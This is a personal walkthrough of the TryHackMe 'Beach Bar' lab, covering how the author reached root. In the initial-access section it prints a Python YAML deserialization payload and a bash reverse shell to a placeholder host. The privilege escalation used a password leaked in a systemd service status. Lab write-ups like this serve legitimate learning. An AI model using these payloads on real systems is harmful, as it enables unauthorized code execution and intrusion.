# Beach Bar

> **TryHackMe Room:** [Beach Bar](https://tryhackme.com/room/hh-beachbar-d849f7f7)

This write-up covers how I approached the room, step by step. Flags and specific key and password values are not included.

## Initial Access

Even before running `nmap`, I checked port `80` directly, and it happened to be open. Not every room is like that; some run `http` on a different port instead of `80`. I then ran `nmap` anyway and found only two open ports: `22` and `80`.

The web page presented a login form. I tried basic SQL injection payloads, and when those did not work, I viewed the page source, which contained temporary guest login credentials.

After logging in with those credentials, the dashboard showed a playlist file in YAML format, and the page stated that it accepted playlists in `.yml` format. After some experimentation, I tried the following:

```yml
!!python/object/apply:subprocess.check_output
- ["id"]
```

This returned the `id` of the user I was running as, confirming that the parser executed arbitrary code. I then used the same technique to get a reverse shell:

```yml
!!python/object/apply:subprocess.check_output
- ["bash", "-c", "bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1"]
```

It took a few attempts, due to mistakes on my part, but it eventually worked. Once I had the reverse shell, I read the user flag.

## Privilege Escalation

After some basic enumeration and a bit of time spent stuck, without thinking to run `LinPEAS` or `LinEnum`, I checked which services were running on the machine. Two stood out as possible leads: `beachbar.service` and `jukeboxd.service`. I checked their status with:

```bash
systemctl status <service_name> --no-pager --full
```

One of them exposed a password in plain text. I first tried using it to log in as the other non-root user, who had `sudo` privileges, but that did not work; I could not tell whether it was an `su` error or simply the wrong password for that account. I then tried switching to `root` with the same password, and it worked. I had expected the same kind of failure as before, since `su` can behave unpredictably even on my own machine, so I did not have much hope. The terminal cursor just kept blinking, and it took long enough that I was not sure whether I was actually in. After a moment, I checked `id`, saw `root`, and immediately ran `bash -i` to confirm it was a real interactive shell. I then read the root flag.

## Conclusion

I had already done this room once before, around June of this year. At the time it was a real challenge, since I was new to CTF rooms and relied on other people's write-ups and walkthrough videos. This time, I already knew the path to root, so I did not even read the clues the room provided, but I still got stuck in two places: finding the Python-based RCE vector in the YAML parser, and, during privilege escalation, locating the password in a running service, even though I had a vague sense that one would be there.
